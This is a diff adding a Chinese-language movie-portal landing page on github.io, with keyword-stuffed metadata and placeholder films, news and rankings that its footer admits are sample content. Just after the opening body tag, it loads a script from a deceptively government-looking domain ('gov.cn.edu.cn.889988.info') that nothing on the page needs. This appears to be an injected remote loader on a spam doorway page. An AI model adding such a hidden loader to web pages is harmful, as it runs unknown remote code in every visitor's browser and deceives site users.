@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="无忧无虑电影网（wuyouwuludianyingwang-app）为您提供最新电影资讯、高清电影在线观看、热门影视推荐与经典影片排行，畅享无忧无虑的观影体验。">
+<meta name="keywords" content="无忧无虑电影网, wuyouwuludianyingwang-app, 电影, 在线电影, 最新电影, 影视推荐, 电影排行">
+<meta name="author" content="无忧无虑电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="无忧无虑电影网 - 畅享高清电影时光">
+<meta property="og:description" content="无忧无虑电影网 wuyouwuludianyingwang-app 专注电影资讯与影视推荐，最新大片、经典重温、热门榜单一网打尽。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wuyouwuludianyingwang-app.github.io">
+<title>无忧无虑电影网 - 高清电影资讯与影视推荐 | wuyouwuludianyingwang-app</title>
+<link rel="canonical" href="https://wuyouwuludianyingwang-app.github.io">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    :root{
+        --bg1:#070b1a; --bg2:#0d1833; --accent:#ff5c8a; --accent2:#7c5cff;
+        --gold:#ffd166; --text:#eaf0ff; --muted:#9fb0d0; --card:rgba(255,255,255,.06);
+        --line:rgba(255,255,255,.12);
+    }
+    html{ scroll-behavior:smooth; }
+    body{
+        font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+        color:var(--text); line-height:1.7;
+        background:var(--bg1);
+        background-image:
+            radial-gradient(900px 500px at 12% -8%, rgba(124,92,255,.35), transparent 60%),
+            radial-gradient(800px 460px at 88% 10%, rgba(255,92,138,.28), transparent 60%),
+            radial-gradient(700px 600px at 50% 108%, rgba(255,209,102,.14), transparent 60%);
+        background-attachment:fixed;
+        overflow-x:hidden;
+    }
+    a{ color:inherit; text-decoration:none; }
+    .wrap{ max-width:1160px; margin:0 auto; padding:0 20px; }
+
+    /* Header */
+    header{ position:sticky; top:0; z-index:50; backdrop-filter:blur(14px); -webkit-backdrop-filter:blur(14px);
+        background:rgba(7,11,26,.72); border-bottom:1px solid var(--line); }
+    .nav{ display:flex; align-items:center; justify-content:space-between; gap:16px; height:64px; }
+    .logo{ display:flex; align-items:center; gap:10px; font-weight:800; letter-spacing:.5px; }
+    .logo .mark{ width:36px; height:36px; border-radius:11px; display:grid; place-items:center; font-size:19px;
+        background:linear-gradient(135deg,var(--accent),var(--accent2)); box-shadow:0 6px 18px rgba(255,92,138,.35); }
+    .logo b{ font-size:17px; }
+    .logo span{ color:var(--muted); font-size:12px; font-weight:600; }
+    .menu{ display:flex; gap:6px; flex-wrap:wrap; }
+    .menu a{ padding:8px 14px; border-radius:999px; font-size:14px; color:var(--muted); transition:.25s; }
+    .menu a:hover{ color:#fff; background:var(--card); }
+    .nav-cta{ padding:9px 18px; border-radius:999px; font-size:13px; font-weight:700; color:#fff;
+        background:linear-gradient(135deg,var(--accent),var(--accent2)); box-shadow:0 8px 20px rgba(124,92,255,.35); }
+    @media(max-width:820px){ .logo span, .nav-cta{ display:none; } .menu a{ padding:7px 10px; font-size:13px; } }
+
+    /* Hero */
+    .hero{ position:relative; padding:76px 0 60px; text-align:center; }
+    .badge{ display:inline-flex; align-items:center; gap:8px; padding:7px 16px; border-radius:999px;
+        font-size:13px; color:var(--gold); background:rgba(255,209,102,.12); border:1px solid rgba(255,209,102,.3); }
+    .badge i{ width:7px; height:7px; border-radius:50%; background:var(--gold); box-shadow:0 0 10px var(--gold); }
+    h1{ font-size:clamp(30px,6vw,58px); line-height:1.15; margin:20px 0 14px; font-weight:900;
+        background:linear-gradient(100deg,#fff 10%,var(--accent) 50%,var(--accent2) 90%);
+        -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .hero p{ max-width:640px; margin:0 auto; color:var(--muted); font-size:clamp(14px,2.4vw,17px); }
+    .hero-actions{ margin-top:28px; display:flex; gap:12px; justify-content:center; flex-wrap:wrap; }
+    .btn{ padding:13px 28px; border-radius:999px; font-size:15px; font-weight:700; transition:.25s; }
+    .btn-primary{ color:#fff; background:linear-gradient(135deg,var(--accent),var(--accent2)); box-shadow:0 12px 26px rgba(124,92,255,.38); }
+    .btn-primary:hover{ transform:translateY(-2px); }
+    .btn-ghost{ color:#fff; border:1px solid var(--line); background:var(--card); }
+    .hero-stats{ margin-top:44px; display:grid; grid-template-columns:repeat(4,1fr); gap:14px; }
+    .stat{ padding:18px 12px; border-radius:18px; background:var(--card); border:1px solid var(--line); }
+    .stat b{ display:block; font-size:26px; background:linear-gradient(100deg,var(--gold),var(--accent)); -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .stat small{ color:var(--muted); font-size:13px; }
+    @media(max-width:640px){ .hero-stats{ grid-template-columns:repeat(2,1fr); } }
+
+    /* Section */
+    section{ padding:64px 0; }
+    .sec-head{ text-align:center; margin-bottom:38px; }
+    .sec-head .kicker{ color:var(--accent); font-size:13px; letter-spacing:3px; font-weight:700; }
+    .sec-head h2{ font-size:clamp(24px,4vw,36px); margin-top:8px; }
+    .sec-head p{ color:var(--muted); margin-top:10px; }
+
+    /* Films grid */
+    .grid{ display:grid; grid-template-columns:repeat(4,1fr); gap:20px; }
+    .film{ position:relative; border-radius:18px; overflow:hidden; background:var(--card); border:1px solid var(--line);
+        transition:.3s; cursor:pointer; }
+    .film:hover{ transform:translateY(-6px); border-color:rgba(255,92,138,.5); }
+    .poster{ aspect-ratio:3/4; display:grid; place-items:center; font-size:38px; color:rgba(255,255,255,.85);
+        background:linear-gradient(160deg,var(--accent),var(--accent2)); position:relative; }
+    .poster::after{ content:""; position:absolute; inset:0;
+        background:linear-gradient(to top, rgba(7,11,26,.95) 0%, rgba(7,11,26,0) 55%); }
+    .film:nth-child(2) .poster{ background:linear-gradient(160deg,#ff9a76,#ff5c8a); }
+    .film:nth-child(3) .poster{ background:linear-gradient(160deg,#5cffd1,#7c5cff); }
+    .film:nth-child(4) .poster{ background:linear-gradient(160deg,#ffd166,#ff9a76); }
+    .film:nth-child(5) .poster{ background:linear-gradient(160deg,#7c5cff,#3d7bff); }
+    .film:nth-child(6) .poster{ background:linear-gradient(160deg,#ff5c8a,#ff7a5c); }
+    .film:nth-child(7) .poster{ background:linear-gradient(160deg,#3d7bff,#5cffd1); }
+    .film:nth-child(8) .poster{ background:linear-gradient(160deg,#a05cff,#ff5c8a); }
+    .tag{ position:absolute; top:12px; left:12px; z-index:3; padding:5px 11px; border-radius:999px; font-size:12px; font-weight:700;
+        background:rgba(0,0,0,.45); backdrop-filter:blur(6px); }
+    .score{ position:absolute; top:12px; right:12px; z-index:3; width:40px; height:40px; border-radius:50%; display:grid; place-items:center;
+        font-weight:800; font-size:14px; color:#0d1833; background:var(--gold); box-shadow:0 4px 12px rgba(255,209,102,.5); }
+    .film-body{ padding:14px 16px 16px; position:relative; z-index:3; }
+    .film-body h3{ font-size:16px; margin-bottom:6px; }
+    .film-body .meta{ font-size:12px; color:var(--muted); display:flex; gap:8px; flex-wrap:wrap; }
+    .film-body .meta em{ font-style:normal; color:var(--accent); }
+    @media(max-width:900px){ .grid{ grid-template-columns:repeat(3,1fr); } }
+    @media(max-width:640px){ .grid{ grid-template-columns:repeat(2,1fr); gap:14px; } }
+
+    /* Categories */
+    .cats{ display:grid; grid-template-columns:repeat(4,1fr); gap:16px; }
+    .cat{ padding:24px; border-radius:20px; background:var(--card); border:1px solid var(--line); transition:.3s; }
+    .cat:hover{ background:linear-gradient(160deg,rgba(255,92,138,.16),rgba(124,92,255,.16)); border-color:rgba(124,92,255,.5); }
+    .cat .ic{ font-size:30px; }
+    .cat h3{ margin:12px 0 6px; font-size:17px; }
+    .cat p{ color:var(--muted); font-size:13px; }
+    @media(max-width:820px){ .cats{ grid-template-columns:repeat(2,1fr); } }
+
+    /* News */
+    .news{ display:grid; grid-template-columns:1.4fr 1fr; gap:22px; }
+    .news-main{ border-radius:22px; overflow:hidden; min-height:320px; display:flex; align-items:flex-end; padding:28px;
+        background:linear-gradient(160deg,var(--accent2),var(--accent)); position:relative; }
+    .news-main::before{ content:""; position:absolute; inset:0; background:radial-gradient(circle at 80% 20%, rgba(255,255,255,.25), transparent 50%); }
+    .news-main .t{ position:relative; z-index:2; }
+    .news-main h3{ font-size:24px; margin:8px 0; }
+    .news-main p{ color:rgba(255,255,255,.85); font-size:14px; }
+    .news-list{ display:flex; flex-direction:column; gap:14px; }
+    .nitem{ display:flex; gap:14px; padding:14px; border-radius:16px; background:var(--card); border:1px solid var(--line); transition:.25s; }
+    .nitem:hover{ border-color:rgba(255,92,138,.5); }
+    .nitem .thumb{ width:88px; height:70px; border-radius:12px; flex-shrink:0; display:grid; place-items:center; font-size:22px;
+        background:linear-gradient(135deg,var(--accent),var(--accent2)); }
+    .nitem h4{ font-size:14px; line-height:1.5; }
+    .nitem small{ color:var(--muted); font-size:12px; }
+    @media(max-width:820px){ .news{ grid-template-columns:1fr; } }
+
+    /* Ranking */
+    .rank{ display:flex; flex-direction:column; gap:12px; }
+    .rank-item{ display:flex; align-items:center; gap:16px; padding:14px 18px; border-radius:16px; background:var(--card);
+        border:1px solid var(--line); transition:.25s; }
+    .rank-item:hover{ transform:translateX(6px); border-color:rgba(255,209,102,.5); }
+    .num{ font-size:24px; font-weight:900; width:38px; text-align:center;
+        background:linear-gradient(100deg,var(--gold),var(--accent)); -webkit-background-clip:text; background-clip:text; color:transparent; }
+    .rank-item .info{ flex:1; }
+    .rank-item .info h4{ font-size:15px; }
+    .rank-item .info small{ color:var(--muted); font-size:12px; }
+    .rank-item .up{ color:var(--gold); font-weight:700; font-size:13px; }
+
+    /* CTA band */
+    .band{ border-radius:28px; padding:44px 32px; text-align:center;
+        background:linear-gradient(120deg,var(--accent),var(--accent2)); position:relative; overflow:hidden; }
+    .band::before{ content:""; position:absolute; width:300px; height:300px; border-radius:50%; right:-90px; top:-120px; background:rgba(255,255,255,.18); }
+    .band h2{ font-size:clamp(22px,4vw,34px); }
+    .band p{ margin:12px 0 22px; color:rgba(255,255,255,.9); }
+
+    /* Footer */
+    footer{ border-top:1px solid var(--line); padding:44px 0 26px; margin-top:30px; }
+    .foot-grid{ display:grid; grid-template-columns:1.6fr 1fr 1fr 1fr; gap:26px; margin-bottom:30px; }
+    .foot-grid h4{ font-size:15px; margin-bottom:12px; color:#fff; }
+    .foot-grid ul{ list-style:none; }
+    .foot-grid li{ margin-bottom:8px; }
+    .foot-grid a{ color:var(--muted); font-size:13px; transition:.2s; }
+    .foot-grid a:hover{ color:var(--accent); }
+    .brand-txt{ color:var(--muted); font-size:13px; max-width:320px; }
+    .copy{ text-align:center; color:var(--muted); font-size:12px; border-top:1px solid var(--line); padding-top:20px; }
+    .copy b{ color:var(--gold); }
+    @media(max-width:820px){ .foot-grid{ grid-template-columns:1fr 1fr; } }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+    <div class="wrap nav">
+        <a class="logo" href="#top" aria-label="无忧无虑电影网">
+            <span class="mark">🎬</span>
+            <span><b>无忧无虑电影网</b><br><span>wuyouwuludianyingwang-app</span></span>
+        </a>
+        <nav class="menu" aria-label="主导航">
+            <a href="#home">首页</a>
+            <a href="#hot">热映推荐</a>
+            <a href="#types">电影分类</a>
+            <a href="#news">影视资讯</a>
+            <a href="#rank">口碑排行</a>
+            <a href="#about">关于我们</a>
+        </nav>
+        <a class="nav-cta" href="#hot">立即观影</a>
+    </div>
+</header>
+
+<main id="top">
+
+    <!-- 首页 -->
+    <section id="home" class="hero">
+        <div class="wrap">
+            <span class="badge"><i></i> 每日更新 · 精选片单 · 畅快观影</span>
+            <h1>无忧无虑电影网<br>让每一次观影都轻松自在</h1>
+            <p>无忧无虑电影网（wuyouwuludianyingwang-app）致力于为影迷打造简洁、清爽、好用的电影门户：最新电影资讯、高分影片推荐、类型化片单与实时口碑排行，一网打尽。</p>
+            <div class="hero-actions">
+                <a class="btn btn-primary" href="#hot">探索热映影片</a>
+                <a class="btn btn-ghost" href="#types">按类型找电影</a>
+            </div>
+            <div class="hero-stats">
+                <div class="stat"><b>12000+</b><small>收录影片</small></div>
+                <div class="stat"><b>60+</b><small>电影分类</small></div>
+                <div class="stat"><b>每日</b><small>资讯更新</small></div>
+                <div class="stat"><b>8.6</b><small>平均评分</small></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 热映推荐 -->
+    <section id="hot">
+        <div class="wrap">
+            <div class="sec-head">
+                <div class="kicker">HOT SHOWING</div>
+                <h2>热映推荐 · 正在刷屏的好电影</h2>
+                <p>编辑团队每日精选，涵盖动作、爱情、科幻、动画等多种类型</p>
+            </div>
+            <div class="grid">
+                <article class="film"><div class="poster">🚀<span class="tag">科幻</span><span class="score">9.1</span></div><div class="film-body"><h3>星际回响</h3><div class="meta"><em>2026</em>· 148分钟 · 英语</div></div></article>
+                <article class="film"><div class="poster">🥷<span class="tag">动作</span><span class="score">8.7</span></div><div class="film-body"><h3>暗夜猎手</h3><div class="meta"><em>2026</em>· 126分钟 · 汉语</div></div></article>
+                <article class="film"><div class="poster">💗<span class="tag">爱情</span><span class="score">8.9</span></div><div class="film-body"><h3>海边的来信</h3><div class="meta"><em>2025</em>· 112分钟 · 韩语</div></div></article>
+                <article class="film"><div class="poster">🐉<span class="tag">动画</span><span class="score">9.3</span></div><div class="film-body"><h3>云上神兽</h3><div class="meta"><em>2026</em>· 105分钟 · 国语</div></div></article>
+                <article class="film"><div class="poster">🕵️<span class="tag">悬疑</span><span class="score">8.5</span></div><div class="film-body"><h3>第13号房间</h3><div class="meta"><em>2025</em>· 134分钟 · 英语</div></div></article>
+                <article class="film"><div class="poster">⚔️<span class="tag">历史</span><span class="score">8.8</span></div><div class="film-body"><h3>铁衣山河</h3><div class="meta"><em>2026</em>· 162分钟 · 汉语</div></div></article>
+                <article class="film"><div class="poster">🤖<span class="tag">科幻</span><span class="score">8.6</span></div><div class="film-body"><h3>仿生回声</h3><div class="meta"><em>2026</em>· 119分钟 · 英语</div></div></article>
+                <article class="film"><div class="poster">🌿<span class="tag">剧情</span><span class="score">9.0</span></div><div class="film-body"><h3>风过麦田</h3><div class="meta"><em>2025</em>· 140分钟 · 汉语</div></div></article>
+            </div>
+        </div>
+    </section>
+
+    <!-- 电影分类 -->
+    <section id="types">
+        <div class="wrap">
+            <div class="sec-head">
+                <div class="kicker">GENRES</div>
+                <h2>电影分类 · 按心情挑片子</h2>
+                <p>无忧无虑电影网覆盖主流电影类型，快速定位你想看的风格</p>
+            </div>
+            <div class="cats">
+                <a class="cat" href="#"><div class="ic">💥</div><h3>动作冒险</h3><p>飙车、枪战、功夫与极限营救</p></a>
+                <a class="cat" href="#"><div class="ic">💫</div><h3>科幻奇幻</h3><p>星际旅行、时间悖论与异世界</p></a>
+                <a class="cat" href="#"><div class="ic">❤️</div><h3>爱情青春</h3><p>心动、重逢与成长的模样</p></a>
+                <a class="cat" href="#"><div class="ic">😂</div><h3>喜剧搞笑</h3><p>解压放松，笑着度过夜晚</p></a>
+                <a class="cat" href="#"><div class="ic">🎭</div><h3>剧情文艺</h3><p>人生百态，值得慢慢品味</p></a>
+                <a class="cat" href="#"><div class="ic">🧩</div><h3>悬疑犯罪</h3><p>反转不断，烧脑到最后一秒</p></a>
+                <a class="cat" href="#"><div class="ic">👻</div><h3>恐怖惊悚</h3><p>深夜慎入，心跳加速体验</p></a>
+                <a class="cat" href="#"><div class="ic">🐾</div><h3>动画亲子</h3><p>全家共享的温暖与想象力</p></a>
+            </div>
+        </div>
+    </section>
+
+    <!-- 影视资讯 -->
+    <section id="news">
+        <div class="wrap">
+            <div class="sec-head">
+                <div class="kicker">INSIGHT</div>
+                <h2>影视资讯 · 读懂银幕内外</h2>
+                <p>电影节动态、幕后故事、观影指南与行业观察</p>
+            </div>
+            <div class="news">
+                <a class="news-main" href="#">
+                    <div class="t">
+                        <span class="badge"><i></i> 头条</span>
+                        <h3>2026 秋季档前瞻：<br>十部值得期待的华语新片</h3>
+                        <p>从现实主义题材到东方奇幻史诗，今年下半年的华语电影市场将迎来一波强势供给。</p>
+                    </div>
+                </a>
+                <div class="news-list">
+                    <a class="nitem" href="#"><div class="thumb">🏆</div><div><h4>第 81 届威尼斯电影节获奖名单揭晓</h4><small>2 小时前 · 电影节</small></div></a>
+                    <a class="nitem" href="#"><div class="thumb">🎞️</div><div><h4>4K 修复版经典老片为何重回影院</h4><small>5 小时前 · 幕后</small></div></a>
+                    <a class="nitem" href="#"><div class="thumb">🍿</div><div><h4>周末观影指南：三部冷门高分片推荐</h4><small>1 天前 · 片单</small></div></a>
+                    <a class="nitem" href="#"><div class="thumb">📈</div><div><h4>全球票房周报：动画电影持续领跑</h4><small>2 天前 · 数据</small></div></a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 口碑排行 -->
+    <section id="rank">
+        <div class="wrap">
+            <div class="sec-head">
+                <div class="kicker">TOP RATED</div>
+                <h2>口碑排行 · 影迷用脚投票</h2>
+                <p>综合评分、讨论热度与上映表现，每周更新</p>
+            </div>
+            <div class="rank">
+                <div class="rank-item"><span class="num">01</span><div class="info"><h4>云上神兽</h4><small>动画 · 2026 · 9.3 分</small></div><span class="up">↑2</span></div>
+                <div class="rank-item"><span class="num">02</span><div class="info"><h4>星际回响</h4><small>科幻 · 2026 · 9.1 分</small></div><span class="up">↑1</span></div>
+                <div class="rank-item"><span class="num">03</span><div class="info"><h4>风过麦田</h4><small>剧情 · 2025 · 9.0 分</small></div><span class="up">—</span></div>
+                <div class="rank-item"><span class="num">04</span><div class="info"><h4>海边的来信</h4><small>爱情 · 2025 · 8.9 分</small></div><span class="up">↑3</span></div>
+                <div class="rank-item"><span class="num">05</span><div class="info"><h4>铁衣山河</h4><small>历史 · 2026 · 8.8 分</small></div><span class="up">↓1</span></div>
+                <div class="rank-item"><span class="num">06</span><div class="info"><h4>暗夜猎手</h4><small>动作 · 2026 · 8.7 分</small></div><span class="up">↓2</span></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 关于 / CTA -->
+    <section id="about">
+        <div class="wrap">
+            <div class="band">
+                <h2>来无忧无虑电影网，轻松找到好电影</h2>
+                <p>网站地址：https://wuyouwuludianyingwang-app.github.io ｜ 每日更新片单与资讯，做你随身的观影参谋</p>
+                <a class="btn btn-ghost" href="#top" style="background:rgba(255,255,255,.2);border-color:rgba(255,255,255,.5);">返回顶部</a>
+            </div>
+            <div class="foot-grid" style="margin-top:40px;">
+                <div>
+                    <a class="logo" href="#top"><span class="mark">🎬</span><b>无忧无虑电影网</b></a>
+                    <p class="brand-txt" style="margin-top:12px;">无忧无虑电影网（wuyouwuludianyingwang-app）是一个专注于电影资讯、影片推荐与影视文化的导航型网站，帮助影迷更快发现值得一看的好电影。</p>
+                </div>
+                <div>
+                    <h4>快速导航</h4>
+                    <ul>
+                        <li><a href="#hot">热映推荐</a></li>
+                        <li><a href="#types">电影分类</a></li>
+                        <li><a href="#news">影视资讯</a></li>
+                        <li><a href="#rank">口碑排行</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>影片类型</h4>
+                    <ul>
+                        <li><a href="#">动作</a></li>
+                        <li><a href="#">科幻</a></li>
+                        <li><a href="#">爱情</a></li>
+                        <li><a href="#">动画</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>关于本站</h4>
+                    <ul>
+                        <li><a href="#about">网站简介</a></li>
+                        <li><a href="#">免责声明</a></li>
+                        <li><a href="#">联系合作</a></li>
+                        <li><a href="#">更新日志</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="copy">
+                © <span id="yr">2026</span> 无忧无虑电影网 wuyouwuludianyingwang-app · 网站网址：https://wuyouwuludianyingwang-app.github.io<br>
+                本页为静态演示页面，影片、评分与资讯均为示例内容，仅用于网站结构与 UI 展示，不代表真实上映或评分信息。
+            </div>
+        </div>
+    </section>
+
+</main>
+
+<script>
+    document.getElementById('yr').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
